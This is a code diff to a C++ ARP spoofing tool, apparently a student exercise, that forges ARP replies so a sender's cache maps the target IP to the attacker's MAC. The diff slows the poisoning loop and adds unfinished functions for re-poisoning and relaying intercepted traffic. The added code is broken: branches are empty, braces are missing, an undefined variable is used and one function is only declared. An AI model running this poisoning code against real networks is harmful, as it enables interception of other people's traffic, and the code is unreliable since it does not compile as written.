@@ -5,6 +5,9 @@ void check_mac(pcap_t* handle, Ip ip, Mac mac);
 void get_mydevice(char *dev, Mac *mymac, Ip *myip);
 void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle);
 void infect(pcap_t* handle);
+void infect_2(pcap_t* habdle);
+int check_recover(const u_char* packet);
+int check_relay(const u_char* packet);
 Mac get_mac(pcap_t* handle, Ip sender_ip);
 
 #pragma pack(push, 1)
@@ -71,7 +74,6 @@ int main(int argc, char *argv[])
         info.sender_mac = infomap[sender_Ip];
         info.target_mac = infomap[target_Ip];
         info_list.push_back(info);
-        
     }
     std::thread t1(infect, handle);
     t1.join();
@@ -160,9 +162,50 @@ void infect(pcap_t* handle)
             printf("공격 하는중입니당 :)\n");
             send_arp_packet(iter.sender_mac, attacker_mac, 2, attacker_mac, iter.target_Ip, iter.sender_mac, iter.sender_Ip, handle);
         }
-        sleep(1);
+        sleep(3);
     }
 }
+
+void infect_2(pcap_t* handle)
+{
+    struct pcap_pkthdr* header;
+	const u_char* replyPacket;
+	while(thread){
+
+		int res = pcap_next_ex(handle, &header, &replyPacket);
+		if (res == 0) continue;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			break;
+		}
+		
+        //recover가 필요하면 재감영 시켜주자
+        if(check_recover(replyPacket))
+        {
+
+        }
+
+        //relay 필요하면 보내기
+        if(check_relay(replyPacket))
+        {
+
+        }
+		
+}
+
+int check_recover(const u_char* packet)
+{
+      EthArpPacket packet = *((EthArpPacket *)received_packet);
+  if (packet.eth_.type() != EthHdr::Arp) return false;
+  if (packet.arp_.op_ != htons(ArpHdr::Request)) return false;
+  if (packet.eth_.dmac() == sender_mac || packet.eth_.dmac() == target_mac ||
+      packet.eth_.dmac() == Mac("ff:ff:ff:ff:ff:ff")) {
+    return true;
+  }
+  return false;
+}
+
+int check_relay(const u_char* packet);
 
 Mac get_mac(pcap_t *handle, Ip Ip)
 {
